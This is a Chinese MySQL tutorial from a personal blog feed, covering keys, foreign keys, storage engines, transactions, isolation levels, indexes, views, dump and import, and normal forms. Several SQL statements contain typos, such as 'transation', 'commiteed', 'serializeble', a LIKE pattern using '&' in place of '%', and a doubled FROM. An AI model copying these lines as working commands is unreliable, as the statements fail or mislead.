 insert into t_user(id,username) values(2,&apos;as&apos;);
 insert into t_user(id,username) values(3,&apos;w&apos;);
 insert into t_user(id,username) values(4,&apos;s&apos;);
 select * from t_user;</code></pre><p><em>以下内容是演示一下符合主键，不需要掌握</em></p>
<pre><code>drop table if exists t_user;
 create table t_user(
   id int,
   username varchar(255),
   password varchar(255),
   primary key(id,username)
  );
  insert into t_user(id,username) values(1,&apos;cs&apos;);
  insert into t_user(id,username) values(2,&apos;as&apos;);
  insert into t_user(id,username) values(3,&apos;w&apos;);
  insert into t_user(id,username) values(4,&apos;s&apos;);
  select * from t_user;</code></pre><p><em>mysql提供主键值自增：</em></p>
<pre><code>drop table if exists t_user;
create table t_user(
 id int primary key auto_increment, //id字段自动维护一个自增的数字，从1开始，以1递增
 username varchar(255)
 );
 insert into t_user(username) values(&apos;a&apos;);
 insert into t_user(username) values(&apos;b&apos;);
 insert into t_user(username) values(&apos;c&apos;);
 insert into t_user(username) values(&apos;d&apos;);
 insert into t_user(username) values(&apos;e&apos;);
 insert into t_user(username) values(&apos;f&apos;);
 select * from t_user;</code></pre><p><em>提示：oracle当中也提供了一个自增机制，叫做序列（sequence）对象</em></p>
<h2 id="外键约束"><a href="#外键约束" class="headerlink" title="外键约束"></a>外键约束</h2><p>*　关于外键约束的相关术语*<br>    外键约束：foreign key<br>    外键字段：添加有外键约束的字段<br>    外键值：外键字段中的每一个值。</p>
<p><strong>业务背景：</strong><br>*　请设置数据库表，用来维护学生和班级的信息*</p>
<ul>
<li><p>第一种方案：一张表存储所有数据*<br>缺点：冗余。（不推荐）</p>
</li>
<li><p>第二种方案：两张表（班级表和学生表）*<br>t_class 班级表<br>t_student学生表</p>
<p>   t_student中classno字段引用t_class表中的cno字段，此时t_student表叫做字表。t_class表叫做父表。<br>   删除数据的时候，先删除子表，再删除父表。<br>   添加数据的时候，先添加父表，再添加子表。<br>   创建表的时候，先创建父表，再创建子表。<br>   删除表的时候，先删除子表，再删除父表。</p>
<p>   drop table if exists t_student;<br>   drop table if exists t_class;</p>
<p>   create table t_class(</p>
<pre><code>cno int ,
cname varchar(255),
primary key(cno)
);</code></pre><p>   create table t_student(</p>
<pre><code> sno int,
 sname varchar(255),
 classno int,
 primary key(sno),
 foreign key(classno) references t_class(cno)
);

insert into t_class values(101,&apos;xxxxxxxxxxxxx&apos;);
insert into t_class values(102,&apos;yyyyyyyyyyyyy&apos;);

insert into t_student values(1,&apos;zs1&apos;,101);
insert into t_student values(2,&apos;zs2&apos;,101);
insert into t_student values(3,&apos;zs3&apos;,102);
insert into t_student values(4,&apos;zs4&apos;,102);
select * from t_class;
select * from t_student;</code></pre></li>
</ul>
<p>+—–+—————+<br>| cno | cname         |<br>+—–+—————+<br>| 101 | xxxxxxxxxxxxx |<br>| 102 | yyyyyyyyyyyyy |<br>+—–+—————+<br>2 rows in set (0.00 sec)</p>
<p>+——+——-+———+<br>| sno  | sname | classno |<br>+——+——-+———+<br>|    1 | zs1   |     101 |<br>|    2 | zs2   |     101 |<br>|    3 | zs3   |     102 |<br>|    4 | zs4   |     102 |<br>+——+——-+———+<br>4 rows in set (0.00 sec)</p>
<p><em>外键值可以为NULL？</em><br>　可以为NULL</p>
<p><em>外键字段引用其他表的某个字段的时候，被引用的字段必须是主键吗？</em><br>　注意：被引用的字段不一定是主键，但至少具有unique约束。</p>
<h1 id="存储引擎（整个内容属于了解内容）"><a href="#存储引擎（整个内容属于了解内容）" class="headerlink" title="存储引擎（整个内容属于了解内容）"></a>存储引擎（整个内容属于了解内容）</h1><h2 id="完整的建表语句"><a href="#完整的建表语句" class="headerlink" title="完整的建表语句"></a>完整的建表语句</h2><pre><code>CREATE TABLE `t_x` (
`id` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

注意：在mysql当中，凡是标识符是可以使用飘号括起来的。&apos;`&apos;

建表的时候可以指定存储引擎，也可以指定字符集。
mysql默认使用的存储引擎是InnoDB方式
默认采用的字符集是UTF-8</code></pre><h2 id="什么时存储引擎？"><a href="#什么时存储引擎？" class="headerlink" title="什么时存储引擎？"></a>什么时存储引擎？</h2><p>*　存储引擎这个名字只有在mysql中存在。（Oracle中有对应的机制，但是不叫做存储引擎。 oracle没有特殊的名字，就是“表的存储方式”）*</p>
<p><strong>mysql支持很多存储引擎，每一个存储引擎都对应了一种不同的存储方式。</strong><br><strong>每一个存储引擎都有自己的优缺点，需要在合适的时机选择合适的存储引擎。</strong></p>
<p>———–+<br>| Engine             | Support | Comment                                                        | Transactions | XA   | Savepoints |<br>+——————–+———+—————————————————————-+————–+——+————+<br>| InnoDB             | DEFAULT | Supports transactions, row-level locking, and foreign keys     | YES          | YES  | YES        |<br>| MRG_MYISAM         | YES     | Collection of identical MyISAM tables                          | NO           | NO   | NO         |<br>| MEMORY             | YES     | Hash based, stored in memory, useful for temporary tables      | NO           | NO   | NO         |<br>| BLACKHOLE          | YES     | /dev/null storage engine (anything you write to it disappears) | NO           | NO   | NO         |<br>| MyISAM             | YES     | MyISAM storage engine                                          | NO           | NO   | NO         |<br>| CSV                | YES     | CSV storage engine                                             | NO           | NO   | NO         |<br>| ARCHIVE            | YES     | Archive storage engine                                         | NO           | NO   | NO         |<br>| PERFORMANCE_SCHEMA | YES     | Performance Schema                                             | NO           | NO   | NO         |<br>| FEDERATED          | NO      | Federated MySQL storage engine                                 | NULL         | NULL | NULL       |</p>
<h2 id="常见的存储引擎"><a href="#常见的存储引擎" class="headerlink" title="常见的存储引擎"></a>常见的存储引擎</h2><p>　MyISAM<br>　Transactions: No<br><em>MyISAM这种存储引擎不支持事务。</em><br><em>MyISAM是Mysql最常用的存储引擎，但是这种引擎不是默认的</em><br><em>MyISAM采用三个文件组织一张表：</em><br>    xxx.frm（存储格式的文件）<br>    xxx.MYD（存储表中数据的文件）<br>    xxx.MYI（存储表中索引的文件）<br>    优点：可被压缩，节省存储空间。并且可以转换为只读表，提高检索效率。<br>    缺点：不支持事务</p>
<hr>
<p>　InnoDB<br>*　优点：支持事务、行级锁、外键等。这种存储引擎数据的安全得到保障。</p>
<p>*　表的结构存储在xxx.frm文件中*<br>*　数据存储在tablespace这样的表空间中（逻辑概念），无法被压缩，无法转换只读。*<br>*　这种InnoDB存储引擎在Mysql数据库崩溃之后提供自动恢复机制*<br>*　InnoDB支持级联删除和级联更新*</p>
<hr>
<p>　MEMORY<br>　<em>缺点：不支持事务。数据容易丢失，因为所有数据和索引都是存储在内存当中的。</em><br>　<em>优点：查询速度最快<br>*</em>以前叫做HEPA引擎**</p>
<h1 id="事务（Transaction）"><a href="#事务（Transaction）" class="headerlink" title="事务（Transaction）"></a>事务（Transaction）</h1><h2 id="什么是事务"><a href="#什么是事务" class="headerlink" title="什么是事务"></a>什么是事务</h2><p>　<em>一个事务是一个完整的业务逻辑单元，不可再分。</em><br><strong>例如：银行账户转账，从A账户向B账户转账10000，需要执行两条update语句</strong></p>
<pre><code>    update t_act set balance = balance - 10000 where actno = &apos;act-001&apos;;
    update t_act set balance = balance + 10000 where actno = &apos;act-002&apos;;

以上两条DML语句必须同时成功，或者同时失败，不允许出现一条成功，一条失败。

要想保证以上的两条DML语句同时成功或者同时失败，那么就需要使用数据库的“事务机制”。</code></pre><h2 id="和事务相关的语句只有：DML语句。（insert-delete-update）"><a href="#和事务相关的语句只有：DML语句。（insert-delete-update）" class="headerlink" title="和事务相关的语句只有：DML语句。（insert delete update）"></a>和事务相关的语句只有：DML语句。（insert delete update）</h2><pre><code>*这三个语句都是和数据库表当中“数据”相关的。*</code></pre><p>　    <strong>事务的存在是为了保证数据的完整性，安全性</strong></p>
<h2 id="假设所有的业务都能使用1条DML语句搞定，还需要事务机制吗？"><a href="#假设所有的业务都能使用1条DML语句搞定，还需要事务机制吗？" class="headerlink" title="假设所有的业务都能使用1条DML语句搞定，还需要事务机制吗？"></a>假设所有的业务都能使用1条DML语句搞定，还需要事务机制吗？</h2><p>　<strong>不需要事务。</strong><br>　但实际情况不是这样的，通常一个“事儿（事务【业务】）”需要多条DML语句共同联合完成。</p>
<h2 id="事务的特性？"><a href="#事务的特性？" class="headerlink" title="事务的特性？"></a>事务的特性？</h2><p>　<strong>事务包括四大特性：ACID</strong><br>    A：原子性（Atomicity）：事务是最小的工作单元，不可再分。<br>    C：一致性(Consistency)：事务必须保证多条DML语句同时成功或者同时失败。<br>    I：隔离性(Isolation)：事务A与事务B之间具有隔离。<br>    D：持久性(Durability)：持久性说的是最终数据必须持久化到硬盘文件中，事务才算成功的结束。</p>
<h2 id="关于事务之间的隔离性"><a href="#关于事务之间的隔离性" class="headerlink" title="关于事务之间的隔离性"></a>关于事务之间的隔离性</h2><p>　<strong>事务隔离性存在隔离级别，理论上隔离级别包括4个：</strong><br>　    <em>第一级别：读未提交（read uncommitted）</em><br>      对方事务还没有提交，我们当前事务可以读取到对方未提交的数据。<br>      读未提交存在脏读（Dirty Read）现象：表示读到了脏的数据。<br>    <em>第二级别：读已提交（read committed）</em><br>      对方事务提交之后的数据我方可以读取到。<br>      这种隔离级别解决了：脏读现象没有了<br>      读已提交存在的问题是：不可重复读。<br>    <em>第三级别：可重复读（repeatable read）</em><br>      这种隔离级别解决了：不可重复读问题<br>      这种隔离级别存在的问题是：读取到的数据是幻想。<br>    <em>第四级别：序列化读/串行化读</em><br>      解决了所有问题<br>      效率低，需要事务排队</p>
<pre><code>oracle数据默认的隔离级别是：读已提交。
mysql数据库默认的隔离级别是：可重复读。</code></pre><h2 id="演示事务"><a href="#演示事务" class="headerlink" title="演示事务"></a>演示事务</h2><p>*　mysql事务默认情况下是自动提交的。（什么是自动提交？只要执行任意一条DML语句则提交一次。）<br>　怎么关闭自动提交？start transaction;</p>
<p> 准备表：</p>
<pre><code>drop table if exists t_user;
create table t_user(
  id int primary key auto_increment,
  username varchar(255)
);</code></pre><p>　演示:mysql中的事务是支持自动提交的，只要执行一条DML，则提交一次。</p>
<pre><code>insert into t_user(username) values(&apos;zs&apos;);
select * from t_user;
rollback;
select * from t_user;</code></pre><p>mysql&gt; insert into t_user(username) values(‘zs’);<br>Query OK, 1 row affected (0.01 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>+—-+———-+<br>1 row in set (0.00 sec)</p>
<p>mysql&gt; rollback;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>+—-+———-+<br>1 row in set (0.00 sec)</p>
<p>　演示:使用start transaction;关闭自动提交机制。</p>
<pre><code>start transaction;
insert into t_user(username) values(&apos;lisi&apos;);
select * from t_user;
insert into t_user(username) values(&apos;wangwu&apos;);
select * from t_user;
rollback;
select * from t_user;</code></pre><p>mysql&gt; start transaction;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>mysql&gt; insert into t_user(username) values(‘lisi’);<br>Query OK, 1 row affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>|  4 | lisi     |<br>+—-+———-+<br>2 rows in set (0.00 sec)</p>
<p>mysql&gt; insert into t_user(username) values(‘wangwu’);<br>Query OK, 1 row affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>|  4 | lisi     |<br>|  5 | wangwu   |<br>+—-+———-+<br>3 rows in set (0.00 sec)</p>
<p>mysql&gt; rollback;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>+—-+———-+</p>
<pre><code>start transaction;
insert into t_user(username) values(&apos;wangwu&apos;);
insert into t_user(username) values(&apos;rose&apos;);
insert into t_user(username) values(&apos;jack&apos;);
select * from t_user;
commit;</code></pre><p>mysql&gt; start transaction;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>mysql&gt; insert into t_user(username) values(‘lisi’);<br>Query OK, 1 row affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>|  4 | lisi     |<br>+—-+———-+<br>2 rows in set (0.00 sec)</p>
<p>mysql&gt; insert into t_user(username) values(‘wangwu’);<br>Query OK, 1 row affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>|  4 | lisi     |<br>|  5 | wangwu   |<br>+—-+———-+<br>3 rows in set (0.00 sec)</p>
<p>mysql&gt; rollback;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>+—-+———-+<br>1 row in set (0.00 sec)</p>
<p>mysql&gt; start transaction;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>mysql&gt; insert into t_user(username) values(‘wangwu’);<br>Query OK, 1 row affected (0.01 sec)</p>
<p>mysql&gt; insert into t_user(username) values(‘rose’);<br>Query OK, 1 row affected (0.00 sec)</p>
<p>mysql&gt; insert into t_user(username) values(‘jack’);<br>Query OK, 1 row affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>|  6 | wangwu   |<br>|  7 | rose     |<br>|  8 | jack     |<br>+—-+———-+<br>4 rows in set (0.00 sec)</p>
<p>mysql&gt; commit;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>|  6 | wangwu   |<br>|  7 | rose     |<br>|  8 | jack     |<br>+—-+———-+<br>4 rows in set (0.00 sec)</p>
<p>mysql&gt; rollback;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>|  6 | wangwu   |<br>|  7 | rose     |<br>|  8 | jack     |<br>+—-+———-+<br>4 rows in set (0.00 sec)</p>
<p>　演示两个事务，假设隔离级别<br>　　演示级别1：读未提交</p>
<pre><code>set global transation isolation level read uncommitted;
select @@global.tx_isolation;</code></pre><p>　　演示级别2：读已提交</p>
<pre><code>set global transaction isolation level read commiteed;
select @@global.tx_isolation;</code></pre><p>　　演示级别3：可重复读</p>
<pre><code>set global transaction isolation level repeatable read;</code></pre><p>　　演示级别4：serializeble</p>
<pre><code>set global transaction isolation level serializeble;</code></pre><p>mysql远程登录： mysql -h192.168.151.18 -uroot -p444</p>
<h1 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h1><h2 id="什么时索引？有什么用？"><a href="#什么时索引？有什么用？" class="headerlink" title="什么时索引？有什么用？"></a>什么时索引？有什么用？</h2><p>　<strong>索引就相当于一本书的目录，通过目录可以快速的找到对应的资源。</strong><br>　<strong>在数据库方面，查询一张表的时候有两种检索方式：</strong><br>    <em>第一种方式：全表扫描</em></p>
<ul>
<li><p>第二种方式：根据索引检索（效率很高）*</p>
</li>
<li><p><em>索引为什么可以提高检索效率呢？*</em></p>
</li>
<li><p>　根本的原理是缩小了扫描的范围。</p>
<p>   索引虽然可以提高检索效率，但是不能随意的添加索引，因为索引也是数据库当中的对象，<br>   也需要数据库不断的维护。是有维护成本的。比如，表中的数据经常被修改<br>   这样就不适合添加索引，因为数据一旦修改，索引需要重新排序，进行维护。</p>
<p>   添加索引是给某一个字段，或者说某些字段添加索引</p>
<p>   select ename,sal from emp from where ename = ‘SMITH’;<br>   当ename字段上没有添加索引的时候，以上SQL语句会进行全表扫描，扫描ename字段中所有的值。<br>   当ename字段上添加索引的时候，以上sql语句会根据索引扫描，快速定位。</p>
</li>
</ul>
<h2 id="怎么创建索引对象？怎么删除索引对象？"><a href="#怎么创建索引对象？怎么删除索引对象？" class="headerlink" title="怎么创建索引对象？怎么删除索引对象？"></a>怎么创建索引对象？怎么删除索引对象？</h2><pre><code>创建索引对象
create index 索引名称 on 表名（字段名）;
删除索引对象：
drop　index 索引名称 on 表名</code></pre><h2 id="什么时候考虑给字段添加索引？（满足什么条件）"><a href="#什么时候考虑给字段添加索引？（满足什么条件）" class="headerlink" title="什么时候考虑给字段添加索引？（满足什么条件）"></a>什么时候考虑给字段添加索引？（满足什么条件）</h2><p>*　数据量庞大。（根据客户的需求，根据线上的环境）<br>*　该字段很少的DML操作。（因为字段进行修改操作，索引也需要维护）<br>*　该字段经常出现在where子句中。（经常根据哪个字段查询）</p>
<h2 id="注意：主键和具有unique约束的字段自动会添加索引。"><a href="#注意：主键和具有unique约束的字段自动会添加索引。" class="headerlink" title="注意：主键和具有unique约束的字段自动会添加索引。"></a>注意：主键和具有unique约束的字段自动会添加索引。</h2><p>　　根据主键查询效率较高。尽量根据主键检索</p>
<pre><code>select ename,sal from emp where sal = 5000;</code></pre><h2 id="查看sql语句的执行计划："><a href="#查看sql语句的执行计划：" class="headerlink" title="查看sql语句的执行计划："></a>查看sql语句的执行计划：</h2><pre><code>    mysql&gt; explain select ename, sal from emp where sal =5000;
    +----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-------------+
    | id | select_type | table | partitions | type | possible_keys | key  | key_len | ref  | rows | filtered | Extra       |
    +----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-------------+
    |  1 | SIMPLE      | emp   | NULL       | ALL  | NULL          | NULL | NULL    | NULL |   14 |    10.00 | Using where |
    +----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-------------+
    1 row in set, 1 warning (0.01 sec)

给薪资sal字段添加索引：
    create index emp_sal_index on emp(sal);

    mysql&gt; explain select ename, sal from emp where sal =5000;
    +----+-------------+-------+------------+------+---------------+---------------+---------+-------+------+----------+-------+
    | id | select_type | table | partitions | type | possible_keys | key           | key_len | ref   | rows | filtered | Extra |
    +----+-------------+-------+------------+------+---------------+---------------+---------+-------+------+----------+-------+
    |  1 | SIMPLE      | emp   | NULL       | ref  | emp_sal_index | emp_sal_index | 9       | const |    1 |   100.00 | NULL  |
    +----+-------------+-------+------------+------+---------------+---------------+---------+-------+------+----------+-------+
    1 row in set, 1 warning (0.00 sec)</code></pre><h2 id="索引底层采用的数据结构是：B-Tree"><a href="#索引底层采用的数据结构是：B-Tree" class="headerlink" title="索引底层采用的数据结构是：B+Tree"></a>索引底层采用的数据结构是：B+Tree</h2><h2 id="索引的实现原理？"><a href="#索引的实现原理？" class="headerlink" title="索引的实现原理？"></a>索引的实现原理？</h2><p>　<strong>通过B Tree缩小扫描范围，底层索引进行了排序，分区，索引会携带数据在表中的“物理地址”，</strong><br>　<strong>最终通过索引检索到数据之后，获取到关联的物理地址，通过物理地址定位表中的数据，效率是最高的</strong>。</p>
<pre><code>select ename from emp where ename=&apos;SMITH&apos;;
通过索引转换为：
select ename from emp where 物理地址=0x3;</code></pre><h2 id="索引的分类？"><a href="#索引的分类？" class="headerlink" title="索引的分类？"></a>索引的分类？</h2><p>单一索引：给单个字段添加索引<br>复合索引：给多个字段联合起来添加索引<br>主键索引：主键上会自动添加索引<br>唯一索引：有unique约束的字段上会自动添加索引</p>
<h2 id="索引什么时候失效？"><a href="#索引什么时候失效？" class="headerlink" title="索引什么时候失效？"></a>索引什么时候失效？</h2><pre><code>　    select ename from emp where ename like &apos;&amp;A&amp;&apos;;
模糊查询的时候，第一个通配符使用的是%，这个时候后索引是会失效的。</code></pre><h1 id="视图（view）"><a href="#视图（view）" class="headerlink" title="视图（view）"></a>视图（view）</h1><h2 id="什么时视图"><a href="#什么时视图" class="headerlink" title="什么时视图?"></a>什么时视图?</h2><pre><code>**站在不同的角度去看待数据。（同一张表的数据，通过不同的角度去看待）。**</code></pre><h2 id="怎么创建视图？怎么删除视图？"><a href="#怎么创建视图？怎么删除视图？" class="headerlink" title="怎么创建视图？怎么删除视图？"></a>怎么创建视图？怎么删除视图？</h2><pre><code>create view myview as select empno,ename from emp;
drop view myview;

注意：只有DQL语句才能以视图对象的方式创建出来。</code></pre><h2 id="对视图进行增删改查，会影响到原表数据。（通过视图影响原表数据的，不是直接操作的原表）"><a href="#对视图进行增删改查，会影响到原表数据。（通过视图影响原表数据的，不是直接操作的原表）" class="headerlink" title="对视图进行增删改查，会影响到原表数据。（通过视图影响原表数据的，不是直接操作的原表）"></a>对视图进行增删改查，会影响到原表数据。（通过视图影响原表数据的，不是直接操作的原表）</h2><p>可以对视图进行CRUD</p>
<h2 id="面向视图操作"><a href="#面向视图操作" class="headerlink" title="面向视图操作"></a>面向视图操作</h2><p>mysql&gt; select * from myview<br>    -&gt; ;<br>+——-+——–+<br>| empno | ename  |<br>+——-+——–+<br>|  7369 | SMITH  |<br>|  7499 | ALLEN  |<br>|  7521 | WARD   |<br>|  7566 | JONES  |<br>|  7654 | MARTIN |<br>|  7698 | BLAKE  |<br>|  7782 | CLARK  |<br>|  7788 | SCOTT  |<br>|  7839 | KING   |<br>|  7844 | TURNER |<br>|  7876 | ADAMS  |<br>|  7900 | JAMES  |<br>|  7902 | FORD   |<br>|  7934 | MILLER |<br>+——-+——–+<br>14 rows in set (0.01 sec)</p>
<pre><code>create table emp_back as select * from emp;
create view myview1 as select  empno,ename,sal from emp_back;
update myview1 set ename = &apos;hehe&apos;, sal = 1 where empno = 7369 ;//通过视图原表数据
delete from myview1 where empno=7369;//通过视图删除原表数据</code></pre><h2 id="视图的作用？"><a href="#视图的作用？" class="headerlink" title="视图的作用？"></a>视图的作用？</h2><p>　　<em>视图可以隐藏表的实现细节。保密级别较高的系统，数据库只对外提供相关的视图，java程序员只对视图对象进行CRUD操作。</em></p>
<h1 id="DBA命令"><a href="#DBA命令" class="headerlink" title="DBA命令"></a>DBA命令</h1><h2 id="将数据库当中的数据导出"><a href="#将数据库当中的数据导出" class="headerlink" title="将数据库当中的数据导出"></a>将数据库当中的数据导出</h2><pre><code>　　在windows的dos命令窗口中执行：（导出整个库）
mysqldump dongjun&gt;d:\dongjun.sql -uroot -p333333

在windows的dos命令窗口中执行：（导出指定数据库当中的指定表）
    mysqldump dongjun emp&gt;d:\dongjun.sql -uroot -p333333</code></pre><h2 id="导入数据"><a href="#导入数据" class="headerlink" title="导入数据"></a>导入数据</h2><pre><code>create database dongjun;
use dongjun;
source d:\dongjun.sql</code></pre><h1 id="数据库设计三范式（重点内容，面试经常问）"><a href="#数据库设计三范式（重点内容，面试经常问）" class="headerlink" title="数据库设计三范式（重点内容，面试经常问）"></a>数据库设计三范式（重点内容，面试经常问）</h1><h2 id="什么时设计范式？"><a href="#什么时设计范式？" class="headerlink" title="什么时设计范式？"></a>什么时设计范式？</h2><blockquote>
<p>　　<strong>设计表的一句。按照这个三范式设计的标不会出现数据冗余</strong></p>
</blockquote>
<h2 id="三范式都是那些？"><a href="#三范式都是那些？" class="headerlink" title="三范式都是那些？"></a>三范式都是那些？</h2><pre><code>第一范式：任何一张表有应该有主键，并且每一个字段原子性不可再分

第二范式：建立在第一范式的基础之上，所有非主键字段完全依赖主键，不能产生部分依赖
    多对多？三张表，关系表两个外键。
    t_student学生表
    sno(pk)            sname
    ------------------------------
    1            张三
    2            李四
    3            王五

    t_teacher 讲师表
    tno(pk)    tname
    -------------
    1    王老师
    2    张老师
    3    李老师

    t_student_teacher_relation 学生讲师关系表
    id(pk)        sno(fk)        tno(fk)
    -----------------------------------------
    1        1        3
    2        1        1
    3        2        2    2
    4        2        3
    5        3        1
    6        3        3

    第三范式：建立在第二范式的基础之上，所有非主键字段直接依赖主键，不能产生传递依赖。
    一对多？两张表，多的表加外键。
    班级t_class
    cno(pk)        cname
    ------------------------
    1        班级1
    2        班级2

    学生t_student
    sno(pk)        sname        classno(fk)
    --------------------------------------------
    101        张1        1
    102        张2        1
    103        张3        2
    104        张4        2
    105        张5        2

    提醒：在实际的开发中，以满足客户的需求为主，有的时候会拿冗余换执行速度。</code></pre><h2 id="一对一怎么设计？"><a href="#一对一怎么设计？" class="headerlink" title="一对一怎么设计？"></a>一对一怎么设计？</h2><pre><code>一对一设计有两种方案：主键共享
    t_user_login 用户登录表
    id(pk+fk)        username    password
    -----------------------------------------------
    1        zs        123
    2        ls        456

    t_user_detail 用户详细信息表
    id(pk)        realname    tel
    -------------------------------------------
    1        张三        1111111
    2        李四        1111123

一对一设计有两种方案：外键唯一
    t_user_login 用户登录表
    id(pk)        username    password
    -----------------------------------------------
    1        zs        123
    2        ls        456

    t_user_detail 用户详细信息表
    id(pk)        realname    tel        userid(fk+unique)
    -------------------------------------------------------------------
    1        张三        1111111        1
    2        李四        1111123        2</code></pre>]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL查询</title>
    <url>/2020/10/05/MySQL%E6%9F%A5%E8%AF%A2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="查询结果"><a href="#查询结果" class="headerlink" title="查询结果"></a>查询结果</h1><p><strong>关于查询结果集的去重？</strong>（<strong>distinct关键字去除重复记录</strong>）</p>
<blockquote>
<p><strong>mysql&gt; select distinct job from emp;</strong><br>+———–+<br>| job       |<br>+———–+<br>| CLERK     |<br>| SALESMAN  |<br>| MANAGER   |<br>| ANALYST   |<br>| PRESIDENT |<br>+———–+</p>
</blockquote>
<blockquote>
<p><strong>select ename,distinct job from emp;</strong></p>
<p>以上的sql语句是错误的。<br>记住：distinct只能出现在所有字段的最前面。</p>
</blockquote>
<blockquote>
<p><strong>mysql&gt; select distinct deptno,job from emp order by deptno;</strong><br>+——–+———–+<br>| deptno | job       |<br>+——–+———–+<br>|     10 | CLERK     |<br>|     10 | MANAGER   |<br>|     10 | PRESIDENT |<br>|     20 | ANALYST   |<br>|     20 | CLERK     |<br>|     20 | MANAGER   |<br>|     30 | CLERK     |<br>|     30 | MANAGER   |<br>|     30 | SALESMAN  |<br>+——–+———–+</p>
</blockquote>
<p><strong>案例:统计岗位的数量？</strong></p>
<blockquote>
<p>mysql&gt; select count(distinct job) from emp;**<br>+———————+<br>| count(distinct job) |<br>+———————+<br>|                   5 |<br>+———————+<br>1 row in set (0.00 sec)</p>
</blockquote>
<h1 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h1><h2 id="什么是连接查询？"><a href="#什么是连接查询？" class="headerlink" title="什么是连接查询？"></a><strong>什么是连接查询？</strong></h2><p>　<strong>在实际开发中，大部分的情况下都不是从单表中查询数据，一般都是多张表联合查询取出最终的结果。</strong><br>　<strong>在实际开发中，一般一个业务都会对应多张表，比如：学生和班级，起码两张表。</strong><br>　<strong>在实际上数据会存在大量的重复，导致数据的冗余。</strong></p>
<h2 id="连接查询的分类"><a href="#连接查询的分类" class="headerlink" title="连接查询的分类"></a>连接查询的分类</h2><p>　<strong>根据语法出现的年代来划分的，包括：</strong></p>
<p>​    <strong>SQL  92（一些老的DBA可能还在使用这种语法。DBA：Database Administrator）</strong><br>​    <strong>SQL  99（比较新的语法）</strong></p>
<p><strong>根据表的连接方式来划分，包括：</strong></p>
<ul>
<li>内连接：<br>等值连接<br>非等值连接<br>自连接</li>
<li>外连接：<br>左外连接（左连接）<br>右外连接（右连接）</li>
<li>全连接（很少用）</li>
</ul>
<h2 id="在表的连接查询方面有一种现象被称为：笛卡尔积现象"><a href="#在表的连接查询方面有一种现象被称为：笛卡尔积现象" class="headerlink" title="在表的连接查询方面有一种现象被称为：笛卡尔积现象"></a>在表的连接查询方面有一种现象被称为：笛卡尔积现象</h2><p><strong>案例：找出每一个员工的部门名称，要求显示员工名和部门名</strong></p>
<blockquote>
<p>mysql&gt; select ename,deptno from emp;<br>+——–+——–+<br>| ename  | deptno |<br>+——–+——–+<br>| SMITH  |     20 |<br>| ALLEN  |     30 |<br>| WARD   |     30 |<br>| JONES  |     20 |<br>| MARTIN |     30 |<br>| BLAKE  |     30 |<br>| CLARK  |     10 |<br>| SCOTT  |     20 |<br>| KING   |     10 |<br>| TURNER |     30 |<br>| ADAMS  |     20 |<br>| JAMES  |     30 |<br>| FORD   |     20 |<br>| MILLER |     10 |<br>+——–+——–+</p>
<p>mysql&gt; select * from dept<br>    -&gt; ;<br>+——–+————+———-+<br>| DEPTNO | DNAME      | LOC      |<br>+——–+————+———-+<br>|     10 | ACCOUNTING | NEW YORK |<br>|     20 | RESEARCH   | DALLAS   |<br>|     30 | SALES      | CHICAGO  |<br>|     40 | OPERATIONS | BOSTON   |</p>
<p>select ename,dname from emp,dept;</p>
</blockquote>
<blockquote>
